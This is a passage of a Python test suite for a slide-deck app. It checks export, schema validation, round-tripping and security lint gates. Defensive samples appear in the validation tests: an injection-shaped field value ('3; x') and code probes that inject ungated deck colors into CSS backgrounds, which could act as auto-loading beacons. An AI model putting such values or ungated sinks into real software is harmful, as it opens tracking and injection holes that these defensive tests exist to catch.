    the Node harness prints 'PPTX-SKIP: ...' and exits 0 — treated as a soft-skip.
    After the Node harness succeeds, an OPTIONAL python-pptx read-back runs extra
    semantic assertions; it skips cleanly (does not fail the gate) when python-pptx
    is not installed. This suite must never hard-fail CI on a missing optional dep.
    """
    print("\n── PPTX Export E2E Tests (test_pptx_export.cjs) ──")
    test_script = os.path.join(REPO_ROOT, "tests", "test_pptx_export.cjs")
    if not os.path.exists(test_script):
        print("  ⚠️  test_pptx_export.cjs not found, skipping")
        return 0
    try:
        subprocess.run(["node", "--version"], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("  ⚠️  Node.js not available, skipping pptx e2e tests")
        return 0

    # Fixed path so the python-pptx read-back below can find the produced deck.
    import tempfile
    out_pptx = os.path.join(tempfile.gettempdir(), "vela-pptx-export", "tech-talk.pptx")

    try:
        result = subprocess.run(
            ["node", test_script, "--out", out_pptx],
            cwd=REPO_ROOT, capture_output=True, text=True, timeout=300
        )
    except subprocess.TimeoutExpired:
        print("  ❌ PPTX e2e tests timed out (300s)")
        return 1

    output = result.stdout + result.stderr
    if "PPTX-SKIP" in output or "Playwright not found" in output:
        reason = next((l for l in output.splitlines() if "PPTX-SKIP" in l), "Playwright not installed")
        print(f"  ⚠️  {reason.strip()} — skipping pptx e2e tests")
        return 0

    print(result.stdout)
    if result.stderr and result.returncode != 0:
        print(result.stderr)

    if result.returncode == 0:
        m = re.search(r'(\d+)\s+passed', result.stdout)
        print(f"  ✅ {m.group(1) if m else '?'} pptx e2e assertions passed")
    else:
        print(f"  ❌ PPTX e2e tests failed (exit code {result.returncode})")
        return result.returncode

    # ── Optional python-pptx read-back (graceful skip if the dep is absent) ──
    if os.path.exists(out_pptx):
        try:
            from pptx import Presentation
            from pptx.enum.shapes import MSO_SHAPE_TYPE
        except ImportError:
            print("  ⚠️  python-pptx not installed, skipping read-back assertions")
            return 0
        try:
            prs = Presentation(out_pptx)
            n_text = n_auto = n_pic = n_tbl = 0
            for slide in prs.slides:
                for sh in slide.shapes:
                    if sh.has_text_frame and sh.text_frame.text.strip():
                        n_text += 1
                    if sh.shape_type == MSO_SHAPE_TYPE.AUTO_SHAPE:
                        n_auto += 1
                    if sh.shape_type == MSO_SHAPE_TYPE.PICTURE:
                        n_pic += 1
                    if getattr(sh, "has_table", False):
                        n_tbl += 1
            print(f"  ℹ️  python-pptx read-back: {len(prs.slides)} slides · "
                  f"{n_text} text boxes · {n_auto} autoshapes · {n_pic} pictures · {n_tbl} tables")
            rb_fail = 0
            if len(prs.slides) < 5:
                print("  ❌ read-back: fewer than 5 slides"); rb_fail = 1
            if n_text < 1:
                print("  ❌ read-back: no editable text boxes (export would be non-editable)"); rb_fail = 1
            if n_auto < 1:
                print("  ❌ read-back: no native autoshapes"); rb_fail = 1
            if n_tbl < 1:
                print("  ❌ read-back: no native table"); rb_fail = 1
            if rb_fail:
                return 1
            print("  ✅ python-pptx read-back assertions passed")
        except Exception as e:
            print(f"  ❌ python-pptx read-back error: {e}")
            return 1
    return 0


# ━━━ Offline Study Notes (v12.32) Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_study_notes():
    print("\n── Study Notes (v12.32) Tests ──")

    # Imports needed for round-trip tests
    sys.path.insert(0, SCRIPTS)
    try:
        from vela import expand_deck, compact_deck, turbo_deck, unturbo_deck, _SK, _SK_REV
    except Exception as e:
        fail("Import vela.py helpers", str(e))
        return

    # 1. Compact short key registered
    if _SK.get("sN") == "studyNotes" and _SK_REV.get("studyNotes") == "sN":
        ok("_SK short key sN ↔ studyNotes")
    else:
        fail("_SK short key sN ↔ studyNotes", f"_SK.get('sN')={_SK.get('sN')}")

    # Build a minimal full deck with studyNotes on slide 0
    def minimal_deck():
        return {
            "deckTitle": "Study Notes Test",
            "lanes": [{
                "title": "Main",
                "items": [{
                    "title": "Topic",
                    "status": "done",
                    "slides": [
                        {
                            "title": "Intro",
                            "bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6",
                            "duration": 60,
                            "blocks": [{"type": "heading", "text": "Hello", "size": "2xl"}],
                            "studyNotes": {
                                "text": "An **agent** is a goal-driven loop. See [ReAct](https://arxiv.org/abs/2210.03629) or [what an agent is](#agent). Use #3b82f6 for the accent color.",
                                "diagram": "<svg viewBox='0 0 10 10' xmlns='http://www.w3.org/2000/svg'><rect x='1' y='1' width='8' height='8' fill='#3b82f6'/></svg>",
                                "questions": ["Why does this matter?", "When would it fail?"],
                                "glossary": {
                                    "agent": {"definition": "A goal-driven loop.", "url": "https://example.com/a"}
                                }
                            }
                        },
                        {
                            "title": "No notes",
                            "bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6",
                            "duration": 30,
                            "blocks": [{"type": "text", "text": "plain"}]
                        }
                    ]
                }]
            }]
        }

    deck = minimal_deck()

    # 2. validate.py accepts the deck
    tmpdir = tempfile.mkdtemp()
    try:
        deck_path = os.path.join(tmpdir, "sn.vela")
        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(deck, f)
        r = subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), deck_path],
                           capture_output=True, text=True)
        if r.returncode == 0:
            ok("validate.py accepts valid studyNotes")
        else:
            fail("validate.py accepts valid studyNotes", r.stdout + r.stderr)

        # 3. validate.py rejects studyNotes missing required text
        bad = minimal_deck()
        bad["lanes"][0]["items"][0]["slides"][0]["studyNotes"] = {"questions": ["?"]}
        bad_path = os.path.join(tmpdir, "bad.vela")
        with open(bad_path, "w", encoding="utf-8") as f:
            json.dump(bad, f)
        r = subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), bad_path],
                           capture_output=True, text=True)
        if r.returncode != 0 and "studyNotes.text is required" in (r.stdout + r.stderr):
            ok("validate.py rejects missing studyNotes.text")
        else:
            fail("validate.py rejects missing studyNotes.text", r.stdout + r.stderr)

        # 4. validate.py rejects non-dict studyNotes
        bad2 = minimal_deck()
        bad2["lanes"][0]["items"][0]["slides"][0]["studyNotes"] = "just a string"
        bad2_path = os.path.join(tmpdir, "bad2.vela")
        with open(bad2_path, "w", encoding="utf-8") as f:
            json.dump(bad2, f)
        r = subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), bad2_path],
                           capture_output=True, text=True)
        if r.returncode != 0 and "studyNotes must be an object" in (r.stdout + r.stderr):
            ok("validate.py rejects non-dict studyNotes")
        else:
            fail("validate.py rejects non-dict studyNotes", r.stdout + r.stderr)

        # 5. validate.py rejects non-array questions
        bad3 = minimal_deck()
        bad3["lanes"][0]["items"][0]["slides"][0]["studyNotes"]["questions"] = "one, two"
        bad3_path = os.path.join(tmpdir, "bad3.vela")
        with open(bad3_path, "w", encoding="utf-8") as f:
            json.dump(bad3, f)
        r = subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), bad3_path],
                           capture_output=True, text=True)
        if r.returncode != 0 and "studyNotes.questions must be an array" in (r.stdout + r.stderr):
            ok("validate.py rejects non-array studyNotes.questions")
        else:
            fail("validate.py rejects non-array studyNotes.questions", r.stdout + r.stderr)
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    # 6. Compact round-trip: full → compact → expand → equal studyNotes
    deck = minimal_deck()
    compact = compact_deck(copy.deepcopy(deck))
    sn_in_compact = None
    if isinstance(compact.get("S"), list) and compact["S"]:
        sn_in_compact = compact["S"][0].get("sN")
    if sn_in_compact is not None:
        ok("compact_deck emits 'sN' short key for studyNotes")
    else:
        fail("compact_deck emits 'sN' short key", f"got keys: {list(compact.get('S',[{}])[0].keys())}")

    # Color-alias collision guard: the literal "#3b82f6" inside studyNotes.text must survive the palette-alias step
    if sn_in_compact and "#3b82f6" in sn_in_compact.get("text", ""):
        ok("compact_deck preserves literal hex codes inside studyNotes.text")
    else:
        fail("compact_deck preserves literal hex codes inside studyNotes.text",
             f"text after compact: {sn_in_compact.get('text', '') if sn_in_compact else None!r}")

    # Round-trip back to full and compare
    expanded = expand_deck(copy.deepcopy(compact))
    sn_round = expanded.get("lanes", [{}])[0].get("items", [{}])[0].get("slides", [{}])[0].get("studyNotes")
    if sn_round and sn_round.get("text") == deck["lanes"][0]["items"][0]["slides"][0]["studyNotes"]["text"]:
        ok("compact → expand round-trip preserves studyNotes.text verbatim")
    else:
        fail("compact → expand round-trip studyNotes.text",
             f"orig={deck['lanes'][0]['items'][0]['slides'][0]['studyNotes']['text']!r} got={sn_round.get('text') if sn_round else None!r}")
    if sn_round and sn_round.get("questions") == deck["lanes"][0]["items"][0]["slides"][0]["studyNotes"]["questions"]:
        ok("compact → expand round-trip preserves studyNotes.questions")
    else:
        fail("compact → expand round-trip studyNotes.questions")
    if sn_round and sn_round.get("glossary", {}).get("agent", {}).get("definition") == "A goal-driven loop.":
        ok("compact → expand round-trip preserves studyNotes.glossary")
    else:
        fail("compact → expand round-trip studyNotes.glossary")

    # 7. Turbo round-trip
    deck = minimal_deck()
    turbo = turbo_deck(copy.deepcopy(deck))
    # Turbo slides are positional arrays; slide 0 should now have length 11 (10 base + optional position 10)
    slide0_arr = turbo[1][0][1][0][3][0]  # deck → lanes → lane0 → items → item0 → slides → slide0
    if len(slide0_arr) >= 11 and isinstance(slide0_arr[10], dict) and slide0_arr[10].get("text"):
        ok("turbo_deck emits position 10 with studyNotes for carrying slides")
    else:
        fail("turbo_deck emits position 10 with studyNotes", f"slide0 len={len(slide0_arr)}")

    # Slide 1 (no studyNotes) should still be length 10 — backward compatible shape
    slide1_arr = turbo[1][0][1][0][3][1]
    if len(slide1_arr) == 10:
        ok("turbo_deck keeps length 10 for slides without studyNotes (backward compat)")
    else:
        fail("turbo_deck backward-compat length for non-studyNotes slide", f"got len={len(slide1_arr)}")

    unturbo = unturbo_deck(copy.deepcopy(turbo))
    sn_unturbo = unturbo.get("lanes", [{}])[0].get("items", [{}])[0].get("slides", [{}])[0].get("studyNotes")
    if sn_unturbo and sn_unturbo.get("text") == deck["lanes"][0]["items"][0]["slides"][0]["studyNotes"]["text"]:
        ok("turbo → unturbo round-trip preserves studyNotes.text")
    else:
        fail("turbo → unturbo round-trip studyNotes.text")

    # 8. Part-file presence checks
    slides_src = open(os.path.join(PARTS_DIR, "part-slides.jsx"), encoding="utf-8").read()
    if "function StaticStudyPanel" in slides_src and "function StudentPanel" in slides_src:
        ok("StudentPanel + StaticStudyPanel exist in part-slides.jsx")
    else:
        fail("StudentPanel + StaticStudyPanel missing")
    if "data-study-panel" in slides_src:
        ok("data-study-panel test hook present")
    else:
        fail("data-study-panel hook missing")
    if "data-study-marker" in slides_src:
        ok("data-study-marker marker hook present in part-slides.jsx")
    else:
        fail("data-study-marker hook missing in part-slides.jsx")

    list_src = open(os.path.join(PARTS_DIR, "part-list.jsx"), encoding="utf-8").read()
    if "studyNotes" in list_src and "data-study-marker" in list_src:
        ok("TOC row study marker present in part-list.jsx")
    else:
        fail("TOC row study marker missing in part-list.jsx")

    blocks_src = open(os.path.join(PARTS_DIR, "part-blocks.jsx"), encoding="utf-8").read()
    if "function GlossaryLink" in blocks_src and "data-xray-term" in blocks_src:
        ok("GlossaryLink component + X-Ray hook present in part-blocks.jsx")
    else:
        fail("GlossaryLink component missing in part-blocks.jsx")
    # Regression canary: parseInline link extraction regex
    if "\\u0000LINK" in blocks_src and "linkTokens" in blocks_src:
        ok("parseInline link sentinel tokenizer present")
    else:
        fail("parseInline link sentinel tokenizer missing")

    # 9. sanitizeStudyNotes exists + wires in to sanitizeSlide
    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    if "function sanitizeStudyNotes" in imports_src and "sanitizeStudyNotes(clean.studyNotes)" in imports_src:
        ok("sanitizeStudyNotes wired into sanitizeSlide")
    else:
        fail("sanitizeStudyNotes not wired into sanitizeSlide")


# ━━━ Slide Numeric Layout Fields (imageCols & friends) ━━━━━━━━━━━━
# The app clamps these at deck ingress (SLIDE_NUMERIC_BOUNDS in
# part-imports.jsx). validate.py must flag the same bad values at author time so
# a deck never silently renders with a number the author did not write, and the
# turbo format must carry imageCols instead of dropping it on round-trip.
def test_slide_numeric_fields():
    print("\n── Slide Numeric Layout Fields ──")

    sys.path.insert(0, SCRIPTS)
    try:
        from vela import expand_deck, compact_deck, turbo_deck, unturbo_deck
    except Exception as e:
        fail("Import vela.py helpers", str(e))
        return

    def deck_with(slide_extra):
        s = {"title": "S", "bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6",
             "duration": 60, "blocks": [{"type": "heading", "text": "Hi", "size": "2xl"}]}
        s.update(slide_extra)
        return {"deckTitle": "Numeric Test",
                "lanes": [{"title": "Main", "items": [{"title": "T", "status": "done", "slides": [s]}]}]}

    def run_validate(deck):
        tmpdir = tempfile.mkdtemp()
        try:
            p = os.path.join(tmpdir, "n.vela")
            with open(p, "w", encoding="utf-8") as f:
                json.dump(deck, f)
            return subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), p],
                                  capture_output=True, text=True)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    # 1. Valid values are accepted
    for extra, label in [
        ({"imageCols": 3}, "imageCols: 3"),
        ({"imageCols": 1}, "imageCols: 1 (lower bound)"),
        ({"imageCols": 6}, "imageCols: 6 (upper bound)"),
        ({"gap": 16, "splitGap": 32, "contentFlex": 3, "imageFlex": 2}, "gap/splitGap/flex ratios"),
        ({}, "fields absent entirely"),
    ]:
        r = run_validate(deck_with(extra))
        if r.returncode == 0:
            ok(f"validate.py accepts {label}")
        else:
            fail(f"validate.py accepts {label}", r.stdout + r.stderr)

    # 2. Invalid values are rejected with a specific message
    for extra, needle, label in [
        ({"imageCols": 0}, "out of range", "imageCols: 0 (below range)"),
        ({"imageCols": 7}, "out of range", "imageCols: 7 (above range)"),
        ({"imageCols": 2147483647}, "out of range", "imageCols: 2147483647"),
        ({"imageCols": -1}, "out of range", "imageCols: -1"),
        ({"imageCols": "3"}, "must be a number", "imageCols: \"3\" (string)"),
        ({"imageCols": "3; x"}, "must be a number", "imageCols: \"3; x\" (injection-shaped)"),
        ({"imageCols": True}, "must be a number", "imageCols: true (bool)"),
        ({"imageCols": None}, "must be a number", "imageCols: null"),
        ({"imageCols": [3]}, "must be a number", "imageCols: [3]"),
        ({"imageCols": 2.5}, "whole number", "imageCols: 2.5 (fractional)"),
        ({"gap": 5000}, "out of range", "gap: 5000"),
        ({"gap": "16px"}, "must be a number", "gap: \"16px\""),
        ({"splitGap": -5}, "out of range", "splitGap: -5"),
        ({"contentFlex": 1e6}, "out of range", "contentFlex: 1e6"),
        ({"imageFlex": "wide"}, "must be a number", "imageFlex: \"wide\""),
    ]:
        r = run_validate(deck_with(extra))
        out = r.stdout + r.stderr
        if r.returncode != 0 and needle in out:
            ok(f"validate.py rejects {label}")
        else:
            fail(f"validate.py rejects {label}", f"rc={r.returncode} out={out[:300]}")

    # 3. imageCols survives the compact round-trip (unknown slide keys pass through)
    deck = deck_with({"imageCols": 4})
    rt = expand_deck(compact_deck(copy.deepcopy(deck)))
    if rt["lanes"][0]["items"][0]["slides"][0].get("imageCols") == 4:
        ok("compact → expand round-trip preserves imageCols")
    else:
        fail("compact → expand round-trip imageCols",
             f"got {rt['lanes'][0]['items'][0]['slides'][0].get('imageCols')!r}")

    # 4. imageCols survives the turbo round-trip (positional — needs registration)
    turbo = turbo_deck(copy.deepcopy(deck))
    back = unturbo_deck(copy.deepcopy(turbo))
    if back["lanes"][0]["items"][0]["slides"][0].get("imageCols") == 4:
        ok("turbo → unturbo round-trip preserves imageCols")
    else:
        fail("turbo → unturbo round-trip imageCols",
             f"got {back['lanes'][0]['items'][0]['slides'][0].get('imageCols')!r}")

    # A slide with neither studyNotes nor imageCols keeps the length-10 shape
    plain = turbo_deck(deck_with({}))
    if len(plain[1][0][1][0][3][0]) == 10:
        ok("turbo keeps length 10 for slides without studyNotes/imageCols")
    else:
        fail("turbo backward-compat length", f"len={len(plain[1][0][1][0][3][0])}")

    # imageCols without studyNotes still decodes (null placeholder at position 10)
    arr = turbo[1][0][1][0][3][0]
    if len(arr) == 12 and arr[10] is None and arr[11] == 4:
        ok("turbo emits a null studyNotes placeholder before imageCols")
    else:
        fail("turbo imageCols positional encoding", f"arr tail={arr[10:]!r}")

    # 5. Source-of-truth parity: the JS and Python bound tables must agree
    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    m = re.search(r'const SLIDE_NUMERIC_BOUNDS = \{(.*?)\n\};', imports_src, re.S)
    if not m:
        fail("SLIDE_NUMERIC_BOUNDS present in part-imports.jsx")
    else:
        js_bounds = {k: (lo, hi, flag) for k, lo, hi, flag in
                     re.findall(r'(\w+):\s*\[([-\d.]+),\s*([-\d.]+),\s*(true|false)\]', m.group(1))}
        sys.path.insert(0, SCRIPTS)
        import importlib
        vmod = importlib.import_module("validate")
        importlib.reload(vmod)
        py_bounds = vmod.SLIDE_NUMERIC_BOUNDS
        mismatches = []
        if set(js_bounds) != set(py_bounds):
            mismatches.append(f"key sets differ: js={sorted(js_bounds)} py={sorted(py_bounds)}")
        for k in set(js_bounds) & set(py_bounds):
            lo, hi, is_int = py_bounds[k]
            if (float(js_bounds[k][0]) != float(lo) or float(js_bounds[k][1]) != float(hi)
                    or (js_bounds[k][2] == "true") != bool(is_int)):
                mismatches.append(f"{k}: js={js_bounds[k]} py={py_bounds[k]}")
        if not mismatches:
            ok("validate.py SLIDE_NUMERIC_BOUNDS matches part-imports.jsx")
        else:
            fail("SLIDE_NUMERIC_BOUNDS drift", "; ".join(mismatches))

    # 6. imageCols is documented where slide keys are registered
    schema = open(os.path.join(SKILL_DIR, "references", "block-schema.md"), encoding="utf-8").read()
    if "imageCols" in schema:
        ok("imageCols documented in block-schema.md")
    else:
        fail("imageCols missing from block-schema.md")
    if "imageCols" in imports_src.split("const BLOCK_REFERENCE")[1][:2000]:
        ok("imageCols listed in the in-app BLOCK_REFERENCE slide schema")
    else:
        fail("imageCols missing from BLOCK_REFERENCE")

    # 7. The sink re-clamps too (belt-and-braces at the consumption site).
    #    Lives in SlideContent (part-canvas.jsx), split out of part-blocks.jsx.
    canvas_src = open(os.path.join(PARTS_DIR, "part-canvas.jsx"), encoding="utf-8").read()
    if "Math.min(6, Math.max(1, slide.imageCols | 0))" in canvas_src:
        ok("imageCols re-clamped at the render sink")
    else:
        fail("imageCols sink clamp missing in part-canvas.jsx")


# ━━━ Deck-Ingress Key Allowlist (structural) ━━━━━━━━━━━━━━━━━━━━━━
def test_deck_key_allowlist_structure():
    print("\n── Deck-Ingress Key Allowlist ──")

    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()

    for name in ("SAFE_SLIDE_KEYS", "SAFE_BLOCK_KEYS"):
        if f"const {name} = new Set([" in imports_src:
            ok(f"{name} allowlist defined")
        else:
            fail(f"{name} allowlist missing")

    # The sanitizers must BUILD from the allowlist, not copy the caller's object.
    if "const clean = { ...block };" not in imports_src and "for (const k of SAFE_BLOCK_KEYS)" in imports_src:
        ok("sanitizeBlock builds from SAFE_BLOCK_KEYS (no wholesale spread)")
    else:
        fail("sanitizeBlock still spreads the caller's block object")
    if "const clean = { ...slide };" not in imports_src and "for (const k of SAFE_SLIDE_KEYS)" in imports_src:
        ok("sanitizeSlide builds from SAFE_SLIDE_KEYS (no wholesale spread)")
    else:
        fail("sanitizeSlide still spreads the caller's slide object")

    # `_` is a reserved renderer-private namespace — nothing may allowlist one.
    for name in ("SAFE_SLIDE_KEYS", "SAFE_BLOCK_KEYS"):
        m = re.search(r'const ' + name + r' = new Set\(\[(.*?)\]\);', imports_src, re.S)
        body = re.sub(r'//[^\n]*', '', m.group(1)) if m else ""
        keys = re.findall(r'"([^"]+)"', body)
        if keys and not any(k.startswith("_") for k in keys):
            ok(f"{name} reserves the '_' namespace (no underscore keys, {len(keys)} keys)")
        else:
            fail(f"{name} underscore reservation", f"keys={[k for k in keys if k.startswith('_')]}")

    # Recursion cap present and wired with an explicit depth argument (a bare
    # .map(sanitizeBlock) would pass the array INDEX as the depth).
    if "const MAX_BLOCK_DEPTH" in imports_src and "if (depth > MAX_BLOCK_DEPTH) return null;" in imports_src:
        ok("sanitizeBlock enforces MAX_BLOCK_DEPTH")
    else:
        fail("sanitizeBlock recursion cap missing")
    code_only = re.sub(r'//[^\n]*', '', imports_src)  # the pattern is named in comments too
    if ".map(sanitizeBlock)" not in code_only:
        ok("no bare .map(sanitizeBlock) (array index cannot leak into depth)")
    else:
        fail("bare .map(sanitizeBlock) leaks the array index into the depth param")

    # Reconciliation: the two other slide-key lists derive from the allowlists.
    engine_src = open(os.path.join(PARTS_DIR, "part-engine.jsx"), encoding="utf-8").read()
    # part-slides.jsx was split (the SLIDE_KEYS paste-detection heuristic now
    # lives in part-slidepanel.jsx); concatenate in build order to search across both.
    slides_src = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-slides.jsx", "part-slidepanel.jsx")
    )
    if re.search(r'SLIDE_ONLY_KEYS[\s\S]{0,400}SAFE_SLIDE_KEYS[\s\S]{0,160}SAFE_BLOCK_KEYS', engine_src):
        ok("part-engine SLIDE_ONLY_KEYS derived from the ingress allowlists")
    else:
        fail("part-engine SLIDE_ONLY_KEYS still hand-maintained")
    if re.search(r'SLIDE_KEYS\s*=\s*new Set\([\s\S]{0,400}SAFE_SLIDE_KEYS\.has', slides_src):
        ok("part-slides SLIDE_KEYS filtered through SAFE_SLIDE_KEYS")
    else:
        fail("part-slides SLIDE_KEYS not reconciled with the allowlist")

    # The key-drift lint must run as part of the parts lint.
    lint_src = open(os.path.join(DEV_SCRIPTS, "lint.py"), encoding="utf-8").read()
    if "def check_deck_key_drift" in lint_src and "errors += check_deck_key_drift(parts_dir)" in lint_src:
        ok("lint.py key-drift check defined and wired into lint_parts")
    else:
        fail("lint.py key-drift check not wired in")
    if "SAFE_SLIDE_KEYS" in lint_src and "_parse_set_literal" in lint_src:
        ok("lint.py parses the allowlists from part-imports.jsx (single source of truth)")
    else:
        fail("lint.py does not parse the allowlists from source")

    # And it must actually pass on the current tree.
    r = subprocess.run([sys.executable, os.path.join(DEV_SCRIPTS, "lint.py"), "--parts", PARTS_DIR],
                       capture_output=True, text=True)
    if r.returncode == 0:
        ok("lint.py --parts passes (no deck key drift)")
    else:
        fail("lint.py --parts reports drift", r.stdout + r.stderr)

    # The drift check must ALSO catch bracket-notation reads (slide["x"] /
    # block['x']), not only dotted member access — SECURITY.md now states this
    # scope. Prove it by injecting a bracket-read of a non-allowlisted key into a
    # throwaway copy of the parts and asserting the lint fails on it.
    if "BRACKET_RE" in lint_src and "BRACKET_RE.findall" in lint_src:
        ok("lint.py wires a bracket-notation read pattern into the drift check")
    else:
        fail("lint.py does not scan bracket-notation reads")
    import tempfile as _tf, shutil as _sh
    _tmp = _tf.mkdtemp(prefix="vela-drift-")
    try:
        for _f in os.listdir(PARTS_DIR):
            if _f.endswith(".jsx"):
                _sh.copyfile(os.path.join(PARTS_DIR, _f), os.path.join(_tmp, _f))
        _victim = os.path.join(_tmp, "part-blocks.jsx")
        with open(_victim, "a", encoding="utf-8") as _fh:
            _fh.write('\nconst _driftProbe = block["nonAllowlistedBogusKey123"];\n')
        _r = subprocess.run([sys.executable, os.path.join(DEV_SCRIPTS, "lint.py"), "--parts", _tmp],
                            capture_output=True, text=True)
        if _r.returncode != 0 and "nonAllowlistedBogusKey123" in (_r.stdout + _r.stderr):
            ok("lint.py catches a bracket-notation read of a non-allowlisted key")
        else:
            fail("lint.py missed a bracket-notation drift read", _r.stdout + _r.stderr)
    finally:
        _sh.rmtree(_tmp, ignore_errors=True)

    # ── CSS fetch-sink encoder-gate (v13.28) ──────────────────────────
    # A deck color reaching a URL-auto-loading CSS property (background /
    # background-image / mask / …) must pass through the cssColor/cssGradient/
    # cssUrl allowlist encoder (fail-closed). The ingress denylist alone is
    # fail-open. This lint enforces complete mediation so a missed sink can't
    # silently reintroduce a CSS auto-load beacon.
    if "def check_css_fetch_sink_gate" in lint_src and "errors += check_css_fetch_sink_gate(parts_dir)" in lint_src:
        ok("lint.py CSS fetch-sink encoder-gate defined and wired into lint_parts")
    else:
        fail("lint.py CSS fetch-sink encoder-gate not wired in")

    # It must PASS on the current tree (every sink already encoder-gated).
    if r.returncode == 0:
        ok("lint.py --parts passes (all CSS fetch-sinks encoder-gated)")
    else:
        fail("lint.py --parts reports an ungated CSS fetch-sink", r.stdout + r.stderr)

    # And it must CATCH both regression shapes: a raw deck color field written
    # straight into a background, and a bare local that holds an un-encoded deck
    # color reaching a background via a template. Prove both on throwaway copies.
    for _label, _inject in (
        ("raw deck color field in a background",
         '\ncase "beacontest1": return <div style={{ background: block.dotColor }} />;\n'),
        ("ungated local color reaching a background",
         '\ncase "beacontest2": { const _bc = item.color || "#000"; return <div style={{ background: `${_bc}08` }} />; }\n'),
    ):
        _tmp2 = _tf.mkdtemp(prefix="vela-beacon-")
        try:
            for _f in os.listdir(PARTS_DIR):
                if _f.endswith(".jsx"):
                    _sh.copyfile(os.path.join(PARTS_DIR, _f), os.path.join(_tmp2, _f))
            with open(os.path.join(_tmp2, "part-blocks.jsx"), "a", encoding="utf-8") as _fh:
                _fh.write(_inject)
            _r2 = subprocess.run([sys.executable, os.path.join(DEV_SCRIPTS, "lint.py"), "--parts", _tmp2],
                                 capture_output=True, text=True)
            if _r2.returncode != 0 and "fetch-sink not encoder-gated" in (_r2.stdout + _r2.stderr):
                ok(f"lint.py catches an ungated CSS fetch-sink ({_label})")
            else:
                fail(f"lint.py missed an ungated CSS fetch-sink ({_label})", _r2.stdout + _r2.stderr)
        finally:
            _sh.rmtree(_tmp2, ignore_errors=True)


# ━━━ PDF Title-Card Export Tests (v12.57 / v12.58) ━━━━━━━━━━━━━━━
def test_pdf_title_cards():
    print("\n── PDF Title-Card Export Tests ──")

    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    slides_src  = open(os.path.join(PARTS_DIR, "part-slides.jsx"), encoding="utf-8").read()
    # part-pdf.jsx was split (canvas / extract / vector / markdown+html paths);
    # these checks span the canvas modal and the vector modal, so concatenate
    # the split files back in build order to search across all of them.
    pdf_src     = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-pdf.jsx", "part-pdf-extract.jsx", "part-pdf-vector.jsx", "part-export-md.jsx")
    )
    app_src     = open(os.path.join(PARTS_DIR, "part-app.jsx"), encoding="utf-8").read()

    # 1. Shared helper exists and tags its output as a virtual slide
    bm = re.search(r"function buildTitleCardSlide\([^)]*\)\s*\{(.*?)\n\}", imports_src, re.DOTALL)
    if bm and "_virtual: true" in bm.group(1):
        ok("buildTitleCardSlide() exists and marks slide _virtual")
    else:
        fail("buildTitleCardSlide() missing or does not set _virtual: true")

    # 2. Title card uses a light gradient bg (root cause of the dark-box bug was a dark bg)
    if bm and "linear-gradient" in bm.group(1) and "#f8fafc" in bm.group(1):
        ok("buildTitleCardSlide() uses a light gradient background")
    else:
        fail("buildTitleCardSlide() should use a light gradient background")

    # 3. Single source of truth: presentation mode reuses buildTitleCardSlide()
    if "buildTitleCardSlide(" in slides_src:
        ok("part-slides.jsx presentation titleCard reuses buildTitleCardSlide()")
    else:
        fail("part-slides.jsx should reuse buildTitleCardSlide() (single source of truth)")

    # 4. collectAllSlides inserts a title card before each presentCard module's slides
    cm = re.search(r"function collectAllSlides\([^)]*\)\s*\{(.*?)\n\}", pdf_src, re.DOTALL)
    if cm and "item.presentCard" in cm.group(1) and "buildTitleCardSlide(" in cm.group(1):
        ok("collectAllSlides inserts title cards for presentCard modules")
    else:
        fail("collectAllSlides should insert buildTitleCardSlide() for presentCard modules")

    # 5. Export dialog exposes an opt-out toggle + a live count of enabled cards
    if "includeCards" in pdf_src and "titleCardCount" in pdf_src:
        ok("PdfExportModal has includeCards toggle + titleCardCount")
    else:
        fail("PdfExportModal missing includeCards toggle or titleCardCount")

    # 6. Toggling off filters the virtual cards out of the exported set
    if re.search(r"includeCards\s*\?\s*allSlides\s*:\s*allSlides\.filter\(\s*\(s\)\s*=>\s*!s\._virtual", pdf_src):
        ok("includeCards=false filters _virtual cards from export")
    else:
        fail("includeCards toggle should filter !s._virtual from export")

    # 7. titleCardCount counts only the virtual (enabled) cards
    if re.search(r"titleCardCount\s*=\s*useMemo\(\(\)\s*=>\s*allSlides\.filter\(\s*\(s\)\s*=>\s*s\._virtual", pdf_src):
        ok("titleCardCount counts only _virtual cards")
    else:
        fail("titleCardCount should count allSlides.filter(s => s._virtual)")

    # 8. Slide numbering excludes virtual cards in BOTH render paths (raster + vector)
    if pdf_src.count("s._virtual ? 0 : 1") >= 2:
        ok("Slide numbering excludes virtual cards in both render paths")
    else:
        fail("displayTotal should exclude _virtual cards in both render paths")

    # 9. Branding overlays suppressed on virtual title cards in both render paths
    if pdf_src.count("currentSlide._virtual ? null : branding") >= 2:
        ok("Branding suppressed on virtual cards in both render paths")
    else:
        fail("branding should be null for _virtual cards in both render paths")

    # 10. Vector composite-bg fix: gradient hex stop branch before the dark fallback
    grad_branch = re.search(r"rawBgStr\.match\(/#\(\[0-9a-f\]\{3,8\}\)/i\)", pdf_src)
    if grad_branch:
        ok("Vector exporter derives composite bg from gradient's first hex stop")
    else:
        fail("Vector exporter missing gradient-hex composite-bg branch (dark-box fix)")

    # 11. Root invocation passes lanes + branding so cards build with deck accent
    if "collectAllSlides(state.lanes, state.branding)" in app_src:
        ok("part-app.jsx passes lanes + branding to collectAllSlides")
    else:
        fail("part-app.jsx should call collectAllSlides(state.lanes, state.branding)")


# ━━━ New Block Primitives Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def test_block_primitives():
